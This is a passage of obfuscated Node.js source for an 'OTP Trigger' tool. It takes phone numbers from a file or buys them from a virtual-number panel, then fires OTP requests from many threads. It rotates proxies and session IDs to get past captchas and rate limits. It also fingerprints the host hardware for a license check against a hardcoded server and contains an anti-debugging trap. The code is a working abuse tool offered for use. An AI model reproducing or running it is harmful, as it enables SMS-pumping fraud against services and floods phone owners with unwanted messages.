      if (v139 === "success") v140 = chalk.hex("#00A8FF").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#00A8FF")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFD700").bold(v138.replace("Triggered OTP for ", ''));else {
        if (v139 === "retry") v140 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFD700")(v138);else {
          const v141 = v138.match(/\+?\d{7,}/),
            v142 = v141 ? v141[0] : '',
            v143 = v138.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          v140 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v142 ? '' + v142 : '') + chalk.hex("#555555")(v142 ? " → " : '') + chalk.hex("#888888")(v143);
        }
      }
      process.stdout.write("\r[K" + v140 + '\x0a'), this.render();
    }
    ["setStatus"](v144) {}
    ["update"]() {}
    ["render"]() {
      const v145 = this.processed / Math.max(this.totalNumbers, 1),
        v146 = (v145 * 100).toFixed(1),
        v147 = 20;
      const v148 = Math.round(v145 * v147),
        v149 = v147 - v148,
        v150 = chalk.hex("#00A8FF")('█'.repeat(v148)) + chalk.hex("#333333")('░'.repeat(v149)),
        v151 = '\x20\x20' + chalk.hex("#00A8FF").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v150 + chalk.hex("#888888")('\x20' + v146 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00A8FF").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v151);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v152 = Math.floor((Date.now() - this.startTime) / 1000);
      const v153 = Math.floor(v152 / 60),
        v154 = v152 % 60,
        v155 = v153 + 'm\x20' + v154 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  SWOOPA OTP TRIGGER — COMPLETE             ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v155.padEnd(6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v156, v157) {
    return new Promise(v158 => {
      let v159 = 0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn3 = () => {
        process.stdout.write("[2J[H"), printHeader(), console.log("   [33m" + v156 + "[0m\n");
        v157.forEach((v160, v161) => {
          {
            if (v161 === v159) {
              console.log("   [36m➔[35m " + v160.name + "[0m");
            } else console.log("     [90m" + v160.name + "[0m");
          }
        });
      };
      fn3();
      const fn4 = (v162, v163) => {
        {
          if (v163.ctrl && v163.name === 'c') process.exit(0);
          if (v163.name === 'up') v159 = (v159 - 1 + v157.length) % v157.length, fn3();else {
            if (v163.name === "down") v159 = (v159 + 1) % v157.length, fn3();else {
              if (v163.name === "return") {
                process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn4), v158(v157[v159].value);
              }
            }
          }
        }
      };
      process.stdin.on("keypress", fn4);
    });
  }
  async function promptText(v164, v165) {
    return new Promise(v166 => {
      process.stdout.write("   [33m" + v164 + "[0m ");
      let v167 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn5 = v168 => {
        const v169 = v168.toString();
        if (v169.includes('\x0a') || v169.includes('\x0d')) {
          process.stdin.removeListener("data", fn5), v167 += v169.split(/[\r\n]/)[0];
          let v170 = v167.trim();
          if (v170.startsWith('\x22') && v170.endsWith('\x22')) v170 = v170.slice(1, -1);
          v166(v170 || v165);
        } else {
          v167 += v169;
        }
      };
      process.stdin.on("data", fn5);
    });
  }
  async function interactiveWizard() {
    process.stdout.write("[2J[H"), printHeader(), console.log(W.bold("  --- REX SWOOPA AI  ---\n"));
    const v171 = await selectOption("SELECT NUMBER SOURCE", [{
      'name': "📁 Load from file (numbers.txt)",
      'value': "file"
    }, {
      'name': "🌐 Auto fetch from NexaOTP Panel",
      'value': "nexa"
    }]);
    let v172 = "numbers.txt",
      v173 = null;
    if (v171 === "nexa") {
      let v176 = '';
      const v177 = path.join(__dirname, ".nexa_api_key");
      if (fs.existsSync(v177)) {
        {
          const v184 = fs.readFileSync(v177, "utf8").trim(),
            v185 = await selectOption("Found saved API Key (..." + v184.slice(-4) + "). Use it?", [{
              'name': "Yes, use saved key",
              'value': "yes"
            }, {
              'name': "No, enter new key",
              'value': 'no'
            }, {
              'name': "Delete saved key",
              'value': "delete"
            }]);
          if (v185 === "yes") v176 = v184;else {
            if (v185 === "delete") {
              fs.unlinkSync(v177), console.log(G("\n   ✗ Saved key deleted.\n"));
            }
          }
        }
      }
      if (!v176) {
        {
          v176 = await promptText("Enter NexaOTP API Key:", '');
          const v186 = {};
          v186.name = 'No', v186.value = 'no';
          const v187 = await selectOption("Save this key for future use?", [{
            'name': "Yes, save it",
            'value': "yes"
          }, v186]);
          if (v187 === "yes") {
            fs.writeFileSync(v177, v176, "utf8"), console.log(G("\n   ✓ API key saved.\n"));
          }
        }
      }
      let v178 = [],
        v179 = true;
      while (v179) {
        {
          const v188 = await promptText("Enter range #" + (v178.length + 1) + " (e.g. 21624485XXX):", '');
          if (v188) v178.push(v188);
          const v189 = await selectOption("Add another range?", [{
            'name': "Yes",
            'value': "yes"
          }, {
            'name': "No, proceed",
            'value': 'no'
          }]);
          if (v189 === 'no') v179 = false;
        }
      }
      v178.length === 0 && (console.log(R("\n   ✗ You must provide at least one range.\n")), process.exit(1));
      const v180 = await promptText("How many numbers to process? (e.g. 100):", '50'),
        v181 = parseInt(v180) || 50,
        v182 = await selectOption("SELECT NEXA SERVER", [{
          'name': "Server 1 (/get)",
          'value': "/api/v1/numbers/get"
        }, {
          'name': "Server 2 (/p2/get)",
          'value': "/api/v1/numbers/p2/get"
        }, {
          'name': "Server 3 (/p3/get)",
          'value': "/api/v1/numbers/p3/get"
        }]),
        v183 = {};
      v183.apiKey = v176, v183.ranges = v178, v183.totalCount = v181, v183.serverEndpoint = v182, v173 = v183;
    } else {
      v172 = await promptText("Enter Numbers File Path [default: numbers.txt]:", "numbers.txt");
      if (!fs.existsSync(v172)) fs.writeFileSync(v172, '');
    }
    let v174 = await promptText("Enter Proxies File Path (Leave blank for direct) [default: none]:", "none");
    if (v174 === "none" || v174 === '') v174 = '';
    let v175 = await selectOption("SELECT THREADS", [{
      'name': "10 Threads",
      'value': 0xa
    }, {
      'name': "20 Threads (Default)",
      'value': 0x14
    }, {
      'name': "50 Threads (Fast)",
      'value': 0x32
    }, {
      'name': "100 Threads (Extreme)",
      'value': 0x64
    }, {
      'name': "Custom Threads",
      'value': "custom"
    }]);
    if (v175 === "custom") {
      {
        const v190 = await promptText("Enter custom number of threads (e.g. 500):", '20');
        v175 = parseInt(v190) || 20;
      }
    }
    return process.stdin.pause(), {
      'numbersFile': v172,
      'threads': String(v175),
      'proxiesFile': v174,
      'nexaConfig': v173
    };
  }
  function generateHWID() {
    const v191 = require('os'),
      v192 = v191.platform();
    try {
      {
        if (v192 === "win32") {
          const v193 = execSync('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
            'stdio': "pipe",
            'timeout': 0x3a98
          }).toString().trim();
          if (!v193) throw new Error("No hardware data");
          const v194 = crypto.createHash("sha256").update(v193).digest("hex").toUpperCase();
          return "SKING-" + v194.substring(0, 8) + '-' + v194.substring(8, 12) + '-' + v194.substring(12, 16);
        } else {
          {
            let v195 = [];
            try {
              {
                const v199 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
                  'stdio': "pipe",
                  'timeout': 0x1388
                }).toString().trim();
                if (v199 && v199 !== "null") v195.push('A:' + v199);
              }
            } catch (v200) {}
            try {
              if (fs.existsSync("/proc/cpuinfo")) {
                {
                  const v201 = fs.readFileSync("/proc/cpuinfo", "utf8"),
                    v202 = v201.match(/Serial\s*:\s*(\S+)/i),
                    v203 = v201.match(/Hardware\s*:\s*(.+)/i);
                  if (v202 && v202[1] !== "0000000000000000") v195.push('S:' + v202[1].trim());
                  if (v203) v195.push('H:' + v203[1].trim());
                }
              }
            } catch (v204) {}
            try {
              {
                if (fs.existsSync("/etc/machine-id")) {
                  {
                    const v205 = fs.readFileSync("/etc/machine-id", "utf8").trim();
                    if (v205) v195.push('M:' + v205);
                  }
                }
              }
            } catch (v206) {}
            try {
              const v207 = v191.cpus(),
                v208 = v207 && v207.length > 0 ? v207[0].model : "UnknownCPU",
                v209 = v191.totalmem(),
                v210 = v191.release(),
                v211 = v191.hostname();
              v195.push('F:' + v208 + '|' + v209 + '|' + v210 + '|' + v211);
            } catch (v212) {}
            const v196 = v195.join('||'),
              v197 = crypto.createHash("sha256").update(v196).digest("hex").toUpperCase(),
              v198 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
            return v198 + v197.substring(0, 8) + '-' + v197.substring(8, 12) + '-' + v197.substring(12, 16);
          }
        }
      }
    } catch (v213) {
      return '';
    }
  }
  function verifyServerSignature(v214, v215) {
    if (!v215) return false;
    const v216 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v214, "utf8"), v216, Buffer.from(v215, "base64"));
    } catch (v217) {
      return false;
    }
  }
  async function start() {
    const v218 = generateHWID();
    !v218 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1));
    const v219 = generateHWID();
    if (v219 !== v218) {
      console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1);
    }
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("Swoopa OTP Trigger           ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v218.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
    let v220 = false,
      v221 = "Licensed";
    const v222 = Date.now();
    try {
      {
        const v242 = "188.137.176.163",
          v243 = require("http"),
          v244 = await new Promise((v245, v246) => {
            const v247 = {};
            v247.hwid = v218, v247.app_id = "swoopa", v247.version = "1.0.0";
            v247.timestamp = v222;
            const v248 = JSON.stringify(v247),
              v249 = {
                'hostname': v242,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v248)
                },
                'timeout': 0x2710
              };
            const v250 = v243.request(v249, v251 => {
              {
                let v252 = '';
                v251.on("data", v253 => v252 += v253), v251.on("end", () => {
                  try {
                    v245(JSON.parse(v252));
                  } catch (v254) {
                    v246(v254);
                  }
                });
              }
            });
            v250.on("error", v246), v250.on("timeout", function () {
              this.destroy(), v246(new Error("Timeout"));
            }), v250.write(v248), v250.end();
          });
        if (v244) {
          v244.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
          if (v244.status === "banned" || v244.status === "expired" || !v244.sig) {
            {
              await new Promise(v258 => setTimeout(v258, 2000));
              let v257 = String(v244.reason || "NOT REGISTERED");
              if (!v244.reason && !v244.sig) v257 = "NOT REGISTERED / REMOVED";
              console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — SWOOPA TOOL    ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v218.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v257.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
            }
          }
          const v255 = v218 + "|swoopa|1.0.0|" + v222;
          !verifyServerSignature(v255, v244.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
          v220 = true;
          let v256 = v244.token;
          !v256 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
            !v256 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
            const v259 = {};
            v259.hwid = v218, v259.app_id = "swoopa", v259.token = v256;
            const v260 = JSON.stringify(v259),
              v261 = {
                'hostname': v242,
                'port': 0xec1,
                'path': "/api/ping",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v260)
                },
                'timeout': 0x1388
              },
              v262 = v243.request(v261, v263 => {
                {
                  let v264 = '';
                  v263.on("data", v265 => v264 += v265), v263.on("end", () => {
                    try {
                      const v266 = JSON.parse(v264);
                      v266.status === 'ok' && v266.token ? v256 = v266.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1));
                    } catch (v267) {
                      console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                    }
                  });
                }
              });
            v262.on("error", () => {
              console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
              process.exit(1);
            }), v262.on("timeout", function () {
              this.destroy();
              console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
              process.exit(1);
            }), v262.write(v260), v262.end();
          }, 45000);
        }
      }
    } catch (v268) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(1);
    }
    !v220 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    let v223 = process.argv.slice(2),
      v224 = null;
    if (v223.length === 0) {
      const v269 = await interactiveWizard();
      v223 = [v269.numbersFile, v269.threads, v269.proxiesFile], v224 = v269.nexaConfig;
    }
    let v225 = path.resolve(v223[0] || "numbers.txt"),
      v226 = parseInt(v223[1]) || 20,
      v227 = v223[2] !== undefined ? v223[2] : "proxies.txt";
    if (v227.toLowerCase() === "none") v227 = '';
    const v228 = generateHWID();
    v228 !== v218 && (console.error(R("\n  ✗ CRITICAL SECURITY ALERT: Runtime memory injection detected.")), console.error(R("  ✗ HWID mismatch during execution sequence. Aborting...\n")), process.exit(1));
    printHeader(), console.log(B("  ✓ License: " + v221) + G(" | HWID: " + v218));
    let v229 = [];
    !v224 && (!fs.existsSync(v225) && (console.error(R("✗ Error: Numbers file not found: " + v225)), process.exit(1)), v229 = fs.readFileSync(v225, "utf8").split(/\r?\n/).map(v270 => v270.trim()).filter(v271 => v271.length > 5));
    let v230 = [];
    v227 && fs.existsSync(v227) && (v230 = fs.readFileSync(v227, "utf8").split('\x0a').map(v272 => v272.trim()).filter(v273 => v273.length > 0));
    let v231 = v230.map(parseProxy).filter(Boolean);
    if (v224) {
      console.log(C("✓ Target  : NexaOTP API (" + v224.totalCount + " numbers)"));
    } else {
      console.log(C("✓ Loaded " + v229.length + " targets"));
    }
    if (v231.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v231.length));
    console.log(C("✓ Threads : " + v226 + '\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, ''), fs.writeFileSync(DEBUG_FILE, "=== DEBUG SESSION " + new Date().toISOString() + " ===\n");
    const v232 = new Dashboard(v224 ? v224.totalCount : v229.length);
    let v233 = [],
      v234 = [],
      v235 = 0,
      v236 = false;
    v224 && (async () => {
      try {
        for (let v274 = 0; v274 < v224.totalCount; v274++) {
          try {
            {
              const v275 = v224.ranges[Math.floor(Math.random() * v224.ranges.length)],
                v276 = await nexaLimiter.enqueue(() => nexaFetchNumber(v224.apiKey, v275, v224.serverEndpoint));
              if (v276) {
                v235++, v234.length > 0 ? v234.shift()(v276) : v233.push(v276);
              }
            }
          } catch (v277) {
            if (v277.message.includes("Insufficient balance") || v277.message.includes("No numbers available")) break;
          }
        }
      } finally {
        {
          v236 = true;
          while (v234.length > 0) v234.shift()(null);
        }
      }
    })();
    const v237 = v224 ? () => {
      if (v233.length > 0) return Promise.resolve(v233.shift());
      if (v236) return Promise.resolve(null);
      return new Promise(v278 => v234.push(v278));
    } : () => {
      if (v229.length === 0) return Promise.resolve(null);
      const v279 = Math.floor(Math.random() * v229.length);
      return Promise.resolve(v229.splice(v279, 1)[0]);
    };
    let v238 = 0;
    const fn6 = () => {
      {
        if (v231.length === 0) return null;
        const v280 = v231[v238];
        return v238 = (v238 + 1) % v231.length, rotateSessionId(v280);
      }
    };
    function fn7(v281) {
      try {
        const v282 = fs.readFileSync(v225, "utf8"),
          v283 = v282.split(/\r?\n/).filter(v284 => v284.trim() !== v281.trim()).join('\x0a');
        fs.writeFileSync(v225, v283);
      } catch (v285) {}
    }
    const v239 = v224 ? Math.min(v226, v224.totalCount) : Math.min(v226, v229.length),
      v240 = [],
      v241 = setInterval(() => v232.render(), 500);
    async function fn8(v286) {
      while (true) {
        const v287 = await v237();
        if (!v287) break;
        try {
          const v288 = await triggerOTP(v287, {
            'onStatus': v289 => v232.setStatus("Worker " + v286 + ':\x20' + v289),
            'proxy': fn6(),
            'workerId': v286,
            'onCaptchaProxy': v290 => {
              {
                const v291 = v290.original || v290.host + ':' + v290.port,
                  v292 = v231.findIndex(v293 => (v293.original || v293.host + ':' + v293.port) === v291);
                v292 !== -1 && (v231[v292] = rotateSessionId(v231[v292]), v232.addLog("Rotated session → " + v290.host, "retry"));
              }
            }
          });
          if (v288.success) {
            {
              {
                v232.successful++;
                v232.processed++;
                fn7(v287);
                fs.appendFileSync(SUCCESSFUL_FILE, v288.phone + "|OTP_SENT\n");
                v232.addLog("Triggered OTP for " + v288.phone, "success");
              }
            }
          } else {
            if (v288.message.includes("throttled") || v288.message.includes("Rate Limited")) {
              {
                {
                  v232.failed++;
                  v232.processed++;
                  fn7(v287);
                  fs.appendFileSync(FAILED_FILE, v288.phone + '|' + v288.message + '\x0a');
                  v232.addLog("Failed on " + v288.phone + ": Number already used (Throttled)", "error");
                }
              }
            } else {
              if (v288.message.includes("Captcha") || v288.message.includes("timeout") || v288.message.includes("Proxy")) {
                if (v224) {
                  v233.push(v287);
                } else v229.push(v287);
                let v294 = v288.message.includes("Captcha") ? "Captcha IP" : "Proxy Error";
                v232.addLog("Retrying " + v287 + '\x20(' + v294 + ')', "retry");
              } else {
                {
                  {
                    v232.failed++;
                    v232.processed++;
                    fn7(v287);
                    fs.appendFileSync(FAILED_FILE, v288.phone + '|' + v288.message + '\x0a');
                    v232.addLog("Failed on " + v288.phone + ':\x20' + v288.message, "error");
                  }
                }
              }
            }
          }
        } catch (v295) {
          v232.failed++, v232.processed++, v232.addLog("Fatal error on " + v287 + ':\x20' + v295.message, "error");
        }
      }
    }
    for (let v296 = 0; v296 < v239; v296++) v240.push(fn8(v296));
    await Promise.all(v240), clearInterval(v241), v232.render(), v232.stop();
  }
  start()["catch"](v297 => {
    console.error(R("Fatal error: " + v297.message)), process.exit(1);
  });
}
function fn2(v298) {
  function fn9(v299) {
    fn9(++v299);
  }
  try {
    {
      if (v298) return fn9;else fn9(0);
    }
  } catch (v300) {}
}